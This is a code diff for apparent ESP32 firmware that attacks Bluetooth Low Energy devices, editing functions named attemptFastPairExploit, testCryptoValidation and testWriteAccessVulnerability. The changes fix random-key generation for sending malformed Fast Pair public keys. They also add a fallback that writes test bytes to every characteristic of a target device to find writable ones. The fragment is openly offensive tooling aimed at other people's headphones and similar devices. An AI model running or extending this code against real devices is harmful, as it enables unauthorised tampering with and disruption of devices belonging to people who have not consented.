@@ -570,7 +570,7 @@ bool attemptFastPairExploit(NimBLEAddress target) {
     for(auto pChar : chars) {
         String uuid = pChar->getUUID().toString().c_str();
         if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
-        if(pChar->canWriteNoResponse()) {
+        if(pChar->canWrite()) {
             uint8_t test_data[2] = {0x00, 0x00};
             if(pChar->writeValue(test_data, 2, false)) {
                 showAdaptiveMessage("Can write to:", uuid.c_str(), "", "", TFT_YELLOW, false, true);
@@ -616,7 +616,7 @@ bool testCryptoValidation(NimBLEAddress target) {
     tft.print("Testing crypto validation...");
     
     uint8_t randomKey[65];
-    esp_fill_random(randomKey);
+    esp_fill_random(randomKey, sizeof(randomKey));
     randomKey[0] = 0x04;
     
     uint8_t testPacket[67] = {0x00, 0x00};
@@ -639,7 +639,7 @@ bool testCryptoValidation(NimBLEAddress target) {
     }
     
     uint8_t compressedKey[33];
-    esp_fill_random(compressedKey);
+    esp_fill_random(compressedKey, sizeof(compressedKey));
     compressedKey[0] = 0x02;
     
     uint8_t testPacket2[35] = {0x00, 0x00};
@@ -791,12 +791,23 @@ bool testWriteAccessVulnerability(NimBLEAddress target) {
         const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
         
         for(auto pChar : chars) {
-            uint8_t props = pChar->getProperties();
-            if(props & BLE_GATT_CHR_F_WRITE || props & BLE_GATT_CHR_F_WRITE_NR) {
+            if(pChar->canWrite()) {
                 String uuid = pChar->getUUID().toString().c_str();
                 String svcUUID = pService->getUUID().toString().c_str();
                 vulnerableServices.push_back(svcUUID + " -> " + uuid);
                 foundWritable = true;
+                continue;
+            }
+            
+            try {
+                uint8_t testByte = 0x00;
+                if(pChar->writeValue(&testByte, 1, false)) {
+                    String uuid = pChar->getUUID().toString().c_str();
+                    String svcUUID = pService->getUUID().toString().c_str();
+                    vulnerableServices.push_back(svcUUID + " -> " + uuid + " (NO-RESP)");
+                    foundWritable = true;
+                }
+            } catch(...) {
             }
         }
     }
